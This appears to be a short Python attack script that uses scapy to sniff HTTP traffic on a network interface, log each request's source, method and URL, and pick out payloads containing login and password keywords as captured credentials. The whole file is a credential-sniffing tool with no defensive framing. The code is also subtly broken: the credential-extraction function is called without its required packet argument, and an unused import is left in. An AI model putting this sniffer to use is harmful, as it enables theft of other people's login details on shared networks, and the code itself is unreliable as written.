from click import argument
from scapy.all import sniff, Raw, IP
from scapy.layers import http
from colorama import init, Fore
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", action="store",
                        type=str, help="Please specify target interface")
    return parser.parse_args()


def sniff_packet(iface):
    sniff(iface=iface, store=False, prn=process_packet)


def get_login_info(packet):
    if packet.haslayer(Raw):
        load = packet[Raw].load.decode()
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):

        ip = packet[IP].src
        url = packet[http.HTTPRequest].Host.decode(
        ) + packet[http.HTTPRequest].Path.decode()
        method = packet[http.HTTPRequest].Method.decode()
        print("[+]", ip, method, url)

        login_info = get_login_info()
        if login_info:
            print(
                f"{Fore.RED}[*] Possible credentials: {login_info}{Fore.RESET}")


if __name__ == "__main__":
    init()
    arguments = get_arguments()
    sniff_packet(arguments.interface)
